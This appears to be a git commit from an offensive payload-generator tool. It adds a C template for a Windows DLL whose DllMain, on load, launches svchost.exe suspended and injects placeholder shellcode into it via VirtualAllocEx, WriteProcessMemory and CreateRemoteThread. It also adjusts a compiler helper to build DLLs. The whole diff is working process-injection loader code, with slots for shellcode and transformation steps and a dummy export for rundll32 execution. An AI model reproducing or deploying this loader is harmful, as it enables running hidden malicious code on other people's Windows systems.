ddab05a8e12af65bc825d96b88b9d8e97f8bdfa3
Bill Chenyoung <bchenyoung@gmail.com>
2026-08-31 16:12:31 +1000

    Added rundll template

---
+++ c/templates/rundll.py
@@ -0,0 +1,70 @@
+class rundll:
+
+    def imports(self) -> list[str]:
+        return ["#include <windows.h>", 
+                "#include <stdio.h>",
+                "#include <stdlib.h>", 
+                "#include <winternl.h>",
+                "#include <tchar.h>"]
+
+    def compilerOptions(self) -> list[str]:
+        return ['-luser32',
+                '-shared']
+
+    def template(self) -> str:
+        return """
+{imports}
+
+// Use __declspec(dllexport) and WINAPI (stdcall) for the export
+#ifdef __cplusplus
+extern "C" {{
+#endif
+
+const TCHAR* g_szCLSID = _T("{{ 5a869dc1-0f8c-4f37-8ade-0ff0d57f758b }}");
+const TCHAR* g_szProgID = _T("MyComObject.Sample.1");
+const TCHAR* g_szDescription = _T("My Sample COM Component");
+
+{codeblocks}
+
+int executecode(){{
+    {shellcode}
+    {transformers}
+
+    STARTUPINFOA si = {{
+        sizeof(si)
+    }}; 
+    PROCESS_INFORMATION pi; 
+
+    PPEB pPeb;
+    PVOID pImage, pEntry;
+    PIMAGE_NT_HEADERS pNtHeaders;
+    LONG e_lfanew;
+    SIZE_T NumberOfBytesRead;
+    DWORD AddressOfEntryPoint;
+
+    CreateProcessA(NULL, (LPSTR) "C:\\\\windows\\\\system32\\\\svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+
+    LPVOID pRemoteCode = NULL;
+    HANDLE hThread = NULL;
+
+    pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+    WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
+    
+    hThread = CreateRemoteThread(pi.hProcess, NULL, 0, pRemoteCode, NULL, 0, NULL);
+    WaitForSingleObject(hThread, 500);
+    CloseHandle(hThread);
+}}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
+    if (fdwReason == DLL_PROCESS_ATTACH) {{
+        executecode();
+    }}
+    return TRUE;
+}}
+
+__attribute__((dllexport)) void CALLBACK Dummy(HWND hwnd, HINSTANCE h, LPSTR c, int n) {{}}
+
+#ifdef __cplusplus
+}}
+#endif
+"""
--- c/utils/compiler.py
+++ c/utils/compiler.py
@@ -1,12 +1,19 @@
 import subprocess
 
 def compile(code: str, output: str, compilerOptions: list[str]) -> str:
-    if output[-4:] == '.exe':
+    if '-shared' in compilerOptions:
+        if 'dll' not in output:
+            sourcefile = f'{output}.c'
+            outfile = f'{output}.dll'
+        else:
+            sourcefile = f'{output[:-4]}.c'
+            outfile = f'{output}'
+    elif output[-4:] == '.exe':
         sourcefile = f'{output[:-4]}.c'
-        outfile = output
+        outfile = output[:-4]
     else:
         sourcefile = f'{output}.c'
-        outfile = f'{output}.exe'
+        outfile = f'{output}'
     # Write template to temporary file for compilation
     print(f'Writing source code to {sourcefile}')
     open(sourcefile,'w').write(code)
